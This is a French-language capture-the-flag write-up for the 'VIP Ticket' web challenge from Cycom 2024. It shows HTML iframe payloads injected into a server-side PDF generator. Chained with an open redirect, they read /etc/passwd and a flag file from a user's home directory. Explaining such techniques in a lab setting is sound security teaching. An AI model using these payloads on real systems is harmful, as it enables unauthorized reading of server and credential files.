---
title: "VIP Ticket"
date: 2024-04-14T09:03:20-08:00
draft: false
---

# Cycom 2024 - VIP Ticket - Web - 300 points

## Enoncé

Le flag se trouve dans la racine du dossier home de l'un des utilisateurs du serveur.

## Solution

Lors de la génération du PDF, il est possible d'injecter du code HTML. Nous injectons tout d'abord une iframe avec une source pointant sur localhost :

```html
Foo Bar<iframe src=http://localhost/ width=500 height=500></iframe>
```

![Image 1](/images/2024/015/01.png)

Cependant, si nous essayons de charger **/etc/passwd**, rien ne nous est retourné :

```html
Foo Bar<iframe src=file:///etc/passwd width=500 height=500></iframe>
```

![Image 2](/images/2024/015/02.png)

Pour contourner cette restriction, nous devons revenir à la page d'accueil. En examinant le code source de la page, nous remarquons que le bouton "Continue" utilise une redirection.

![Image 3](/images/2024/015/03.png)

![Image 4](/images/2024/015/04.png)

Le paramètre GET **Dest** est vulnérable aux redirections ouvertes :

![Image 3](/images/2024/015/05.png)

![Image 4](/images/2024/015/06.png)

En combinant la redirection ouverte avec l'injection HTML dans la génération de PDF, nous pouvons récupérer le contenu de **/etc/passwd** et ainsi obtenir le nom de l'utilisateur **OxBF** :

```html
Foo Bar<iframe src=http://localhost/redirect.php?dest=file:///etc/passwd width=500 height=500></iframe>
```
![Image 5](/images/2024/015/07.png)

De la même manière, nous pouvons récupérer le flag :

```html
Foo Bar<iframe src=http://localhost/redirect.php?dest=file:///home/OxBF/flag.txt width=500 height=500></iframe>
```

![Image 6](/images/2024/015/08.png)

*Flag: CYCOM{0xBF\*\*\*\*\*\*\*}*

## Auteur

Tindlid





